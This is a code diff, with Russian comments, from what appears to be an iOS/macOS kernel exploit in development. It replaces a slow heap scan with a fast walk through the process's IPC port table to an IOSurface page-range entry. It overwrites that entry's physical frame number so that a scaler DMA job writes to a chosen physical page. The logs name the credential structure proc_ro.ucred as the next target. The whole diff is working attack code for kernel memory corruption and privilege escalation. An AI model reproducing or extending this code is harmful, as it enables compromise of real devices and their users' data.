@@ -5825,126 +5825,95 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
               proven ? @"ПОДТВЕРЖДЁН" : @"НЕ СОШЛОСЬ — стоп (записей не будет)"]);
     if (!backingPA || !proven) { free(ctl); return r; }
 
-    // 3. поле подмены: heap-скан backingPA по формам (1.9.111: прогон 1.9.110
-    //    дал raw=0 pfn64=0 pfn32=2 attr=0 — ядро хранит backing как PFN32
-    //    (PA>>14, u32). Собираем адреса И половину qword'а (lo/hi) — вторая
-    //    половина может быть счётчиком страниц, её не трогаем).
-    uint64_t tableVA = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
-    uint64_t totalPages = kconstant(physSize) >> 14;
-    uint64_t hitVAs[8];
-    uint64_t hitPAs[8];   // PA страницы попадания — для ре-проверки типа перед записью (1.9.118)
-    int hitHalf[8];   // форма поля: 0 = pfn32 lo32, 1 = pfn32 hi32, 2 = raw PA (полная qword-подмена)
-    int hitN = 0;
+    // 3. БЫСТРЫЙ резолв page-list через surface table нашего UC (раунд 17):
+    //    [UC+0xe8] collection → +0xd0 array (индекс = surfaceID) → surfVA →
+    //    +0x178 rangeObj → +0x18 = ranges[0] {pfn32(hi32), pagecount(lo32)}.
+    //    6 kread вместо ~30с скана — подмена успевает до первого execute/wire.
+    //    UC фреймворка находим перебором наших портов (is_table цепочка) —
+    //    само-верифицируется: ranges.hi32<<14 должен совпасть с backingPA.
     uint32_t pfn32 = (uint32_t)(backingPA >> 14);
     uint32_t ctlPFN = (uint32_t)(ctlPA >> 14);
-    int nRaw = 0, nPfn64 = 0, nAttr = 0;
-    uint64_t pfn64 = backingPA >> 14;
-    uint64_t attrPA = backingPA | 0x8000000000000000ULL;
-    for (uint64_t pg = 0; pg < totalPages; pg++) {
-        uint8_t ent[16];
-        kreadbuf(tableVA + pg * 16, ent, 16);
-        if (ent[2] != 0x21) continue;
-        uint64_t pa = kconstant(physBase) + pg * 0x4000;
-        uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
-        if (!kva) continue;
-        uint8_t buf[0x4000];
-        if (!kpRead(kva, buf, sizeof(buf), "paSwap pair scan", r)) continue;
-        for (uint32_t o = 0; o + 8 <= sizeof(buf); o += 8) {
-            uint64_t q = 0;
-            memcpy(&q, buf + o, 8);
-            if (q == backingPA) {
-                if (hitN < 8) {
-                    hitVAs[hitN] = kva + o;
-                    hitPAs[hitN] = pa;
-                    hitHalf[hitN] = 2;   // форма: сырой PA (полная qword-подмена)
-                    kpNote(r, [NSString stringWithFormat:@"  ★ RAW backingPA @ %#llx (heap)", (unsigned long long)(kva + o)]);
-                    hitN++;
-                }
-                nRaw++;
-                continue;
-            }
-            if (q == pfn64) { nPfn64++; continue; }
-            if (q == attrPA) { nAttr++; continue; }
-            uint32_t lo = (uint32_t)q, hi = (uint32_t)(q >> 32);
-            if (lo == pfn32 && hitN < 8) {
-                hitVAs[hitN] = kva + o;
-                hitPAs[hitN] = pa;
-                hitHalf[hitN] = 0;
-                kpNote(r, [NSString stringWithFormat:@"  ★ pfn32(lo32) @ %#llx (qword=%#018llx)", (unsigned long long)(kva + o), (unsigned long long)q]);
-                hitN++;
-            } else if (hi == pfn32 && hitN < 8) {
-                hitVAs[hitN] = kva + o;
-                hitPAs[hitN] = pa;
-                hitHalf[hitN] = 1;
-                kpNote(r, [NSString stringWithFormat:@"  ★ pfn32(hi32) @ %#llx (qword=%#018llx)", (unsigned long long)(kva + o), (unsigned long long)q]);
-                hitN++;
-            }
+    uint64_t isTable = 0;
+    {
+        uint64_t pr2 = 0, tk2 = 0, spc2 = 0, tb2 = 0;
+        if (selfProcM &&
+            kpRead(selfProcM + koffsetof(proc, proc_ro), &pr2, 8, "ps proc_ro2", r) &&
+            kpRead(kp_untag_ptr(pr2) + off_proc_ro_pr_task, &tk2, 8, "ps task2", r) &&
+            kpRead(kp_untag_ptr(tk2) + off_task_itk_space, &spc2, 8, "ps itk2", r) &&
+            kpRead(kp_untag_ptr(spc2) + off_ipc_space_is_table, &tb2, 8, "ps istable2", r)) {
+            isTable = (koffsetof(ipc_space, table_uses_smr) && smr_base && t1sz_boot)
+                      ? kp_untag_ptr(kpSMRDecode(tb2)) : kp_untag_ptr(tb2);
         }
     }
-    kpNote(r, [NSString stringWithFormat:@"  backingPA %#llx = PFN32 %#x; полей собрано=%d (счётчики форм: raw=%d pfn64=%d attr=%d)",
-              (unsigned long long)backingPA, pfn32, hitN, nRaw, nPfn64, nAttr]);
-    if (!hitN) {
-        kpNote(r, @"  backingPA не найден в heap — записей не будет");
+    uint64_t surfVA = 0, rangesVA = 0;
+    if (isTable) {
+        for (uint32_t idx = 0; idx < 0x4000 && !rangesVA; idx++) {
+            uint64_t eVA = isTable + (uint64_t)sizeof_ipc_entry * idx;
+            uint64_t oRaw = 0, kRaw = 0;
+            if (!kpRead(eVA + off_ipc_entry_ie_object, &oRaw, 8, "ps ie_obj", r) || !oRaw) continue;
+            uint64_t portVA = kp_untag_ptr(oRaw);
+            if (!kpLooksLikeKernelPointer(portVA)) continue;
+            if (!kpRead(portVA + off_ipc_port_ip_kobject, &kRaw, 8, "ps ip_kobj", r) || !kRaw) continue;
+            uint64_t ucVA = kp_untag_ptr(kRaw);
+            if (!kpLooksLikeKernelPointer(ucVA)) continue;
+            uint64_t coll = 0;
+            if (!kpRead(ucVA + 0xe8, &coll, 8, "ps uc coll", r)) continue;
+            coll = kp_untag_ptr(coll);
+            if (!kpLooksLikeKernelPointer(coll)) continue;
+            uint64_t cnt = 0;
+            if (!kpRead(coll + 0xd8, &cnt, 8, "ps coll cnt", r)) continue;
+            if (cnt <= dstID || cnt > 0x20000) continue;
+            uint64_t arr = 0;
+            if (!kpRead(coll + 0xd0, &arr, 8, "ps coll arr", r)) continue;
+            arr = kp_untag_ptr(arr);
+            if (!kpLooksLikeKernelPointer(arr)) continue;
+            uint64_t cand = 0;
+            if (!kpRead(arr + (uint64_t)dstID * 8, &cand, 8, "ps surf ptr", r)) continue;
+            cand = kp_untag_ptr(cand);
+            if (!kpLooksLikeKernelPointer(cand)) continue;
+            uint64_t rangeObj = 0, rq = 0;
+            if (!kpRead(cand + 0x178, &rangeObj, 8, "ps rangeObj", r)) continue;
+            rangeObj = kp_untag_ptr(rangeObj);
+            if (!kpLooksLikeKernelPointer(rangeObj)) continue;
+            if (!kpRead(rangeObj + 0x18, &rq, 8, "ps ranges q", r)) continue;
+            if ((uint32_t)(rq >> 32) != pfn32 || (uint32_t)rq != 1) continue;
+            surfVA = cand;
+            rangesVA = rangeObj + 0x18;
+            kpNote(r, [NSString stringWithFormat:@"  ★ UC idx=%#x: surfVA=%#llx rangeObj=%#llx rangesVA=%#llx (qword=%#018llx)",
+                      idx, (unsigned long long)surfVA, (unsigned long long)rangeObj,
+                      (unsigned long long)rangesVA, (unsigned long long)rq]);
+        }
+    }
+    kpNote(r, [NSString stringWithFormat:@"  резолв: isTable=%#llx surfVA=%#llx rangesVA=%#llx",
+              (unsigned long long)isTable, (unsigned long long)surfVA, (unsigned long long)rangesVA]);
+    if (!rangesVA) {
+        kpNote(r, @"  page-list через UC не резолвнулся — записей не будет");
         free(ctl);
         return r;
     }
 
-    // 4. подменяем ВСЕ найденные поля сразу, ДО первого submit dst (раунд 15:
-    //    DVA кэшируется при первом wire — per-hit по одному + ранний submit
-    //    отравлял кэш оригиналом). Затем ОДИН submit с откалиброванным TSD,
-    //    проверка контрольной, restore всех.
+    // 4. подмена ranges[0].pfn ДО первого execute поверхности (раунды 15–16:
+    //    снапшот DVA при первом execute; быстрый резолв = успеваем до wire).
+    //    lo32 (pagecount) сохраняем. Затем ОДИН submit с откалиброванным TSD.
     io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                    IOServiceMatching("AppleM2ScalerCSCDriver"));
-    uint64_t origQ[8];
-    int swapped = 0;
-    for (int h = 0; h < hitN; h++) origQ[h] = 0;
-    // 1.9.119: два прохода — сначала pfn-поля (пишем), raw ПОСЛЕДНИМ и только
-    // диагностически (прогоны умирают без panic-full = EL2-ресет именно на
-    // записи в raw-поле; его страница, видимо, SPTM-охраняемого типа). Тип
-    // страницы логируем для КАЖДОГО hit (не только при несовпадении).
-    for (int pass = 0; pass < 2; pass++) {
-        for (int h = 0; h < hitN; h++) {
-            int form = hitHalf[h];
-            if ((pass == 0 && form == 2) || (pass == 1 && form != 2)) continue;
-            uint64_t hv = hitVAs[h];
-            uint64_t pg = (hitPAs[h] - kconstant(physBase)) >> 14;
-            uint8_t ent[16];
-            kreadbuf(tableVA + pg * 16, ent, 16);
-            if (form == 2) {
-                // raw: ТОЛЬКО диагностика — тип страницы + соседи, БЕЗ записи
-                uint64_t around[2] = {0, 0};
-                kreadbuf(hv, &around[0], 8);
-                kreadbuf(hv + 8, &around[1], 8);
-                kpNote(r, [NSString stringWithFormat:@"  hit #%d raw @ %#llx: тип страницы 0x%02x, содержимое %#018llx %#018llx — НЕ пишем (EL2-сторож)", h,
-                          (unsigned long long)hv, ent[2], (unsigned long long)around[0], (unsigned long long)around[1]]);
-                continue;
-            }
-            if (ent[2] != 0x21) {
-                kpNote(r, [NSString stringWithFormat:@"  hit #%d @ %#llx: страница сменила тип на 0x%02x — ПРОПУСК безопасно", h, (unsigned long long)hv, ent[2]]);
-                continue;
-            }
-            kpNote(r, [NSString stringWithFormat:@"  hit #%d @ %#llx: тип 0x21 ok, пишем pfn-половину", h, (unsigned long long)hv]);
-            uint64_t newQ = 0;
-            kreadbuf(hv, &origQ[h], 8);
-            uint32_t cur = form ? (uint32_t)(origQ[h] >> 32) : (uint32_t)origQ[h];
-            if (cur != pfn32) {
-                kpNote(r, [NSString stringWithFormat:@"  hit #%d @ %#llx: половина уже не наш pfn (%#x) — пропуск", h, (unsigned long long)hv, cur]);
-                origQ[h] = 0;
-                continue;
-            }
-            // пишем ТОЛЬКО совпавшую половину (вторая — счётчик страниц)
-            newQ = form ? ((origQ[h] & 0xFFFFFFFFULL) | ((uint64_t)ctlPFN << 32))
-                        : ((origQ[h] & 0xFFFFFFFF00000000ULL) | ctlPFN);
-            kwritebuf(hv, &newQ, 8);
-            uint64_t rb = 0;
-            kreadbuf(hv, &rb, 8);
-            kpNote(r, [NSString stringWithFormat:@"  hit #%d: ПОДМЕНА %#018llx → %#018llx (форма %d) — readback %@",
-                      h, (unsigned long long)origQ[h], (unsigned long long)newQ, form, rb == newQ ? @"ПРИЛИПЛО" : @"— НЕ прилипло"]);
-            swapped++;
-        }
+    uint64_t origQ = 0;
+    kreadbuf(rangesVA, &origQ, 8);
+    if ((uint32_t)(origQ >> 32) != pfn32) {
+        kpNote(r, [NSString stringWithFormat:@"  ranges qword ушёл (%#018llx) — записи НЕ БУДЕТ", (unsigned long long)origQ]);
+        if (svc) IOObjectRelease(svc);
+        free(ctl);
+        return r;
     }
-    kpNote(r, [NSString stringWithFormat:@"  подменено полей: %d — ПЕРВЫЙ submit dst (wire прочитает подмену)", swapped]);
-    if (swapped && svc) {
+    uint64_t newQ = ((uint64_t)ctlPFN << 32) | (origQ & 0xFFFFFFFFULL);
+    kpNote(r, [NSString stringWithFormat:@"  ПОДМЕНА ranges %#018llx → %#018llx (pfn %#x → %#x, lo32 сохранён)",
+              (unsigned long long)origQ, (unsigned long long)newQ, pfn32, ctlPFN]);
+    kwritebuf(rangesVA, &newQ, 8);
+    uint64_t rb = 0;
+    kreadbuf(rangesVA, &rb, 8);
+    kpNote(r, [NSString stringWithFormat:@"  readback = %#018llx %@", (unsigned long long)rb, rb == newQ ? @"— ПРИЛИПЛО" : @"— НЕ прилипло"]);
+    kpNote(r, @"  ПЕРВЫЙ submit dst (wire прочитает подмену)");
+    if (svc) {
         io_connect_t conn = 0;
         kern_return_t skr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
         if (skr == KERN_SUCCESS && conn) {
@@ -5973,15 +5942,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     IOSurfaceUnlock(dstS, 0, NULL);
     kpNote(r, [NSString stringWithFormat:@"  dst пиксели после submit: ненулевых = %d — %@", nzd,
               nzd ? @"DMA ушёл в ОРИГИНАЛЬНЫЙ backing (кэш DVA не последовал за подменой)" : @"в dst пусто"]);
-    // restore подменённых pfn-полей — с той же ре-проверкой типа (1.9.119)
-    for (int h = 0; h < hitN; h++) {
-        if (!origQ[h] || hitHalf[h] == 2) continue;
-        uint64_t pg = (hitPAs[h] - kconstant(physBase)) >> 14;
-        uint8_t ent[16];
-        kreadbuf(tableVA + pg * 16, ent, 16);
-        if (ent[2] != 0x21) continue;   // страница ушла из heap — не трогаем
-        kwritebuf(hitVAs[h], &origQ[h], 8);
-    }
+    // restore ranges
+    kwritebuf(rangesVA, &origQ, 8);
     if (changed) {
         kpNote(r, [NSString stringWithFormat:@"=== PHYSWRITE DMA CONFIRMED: контрольная страница изменена DMA (%u dword) — подмена page-list ДО wire РАБОТАЕТ. Дальше цель = страница proc_ro.ucred ===", changed]);
     } else {
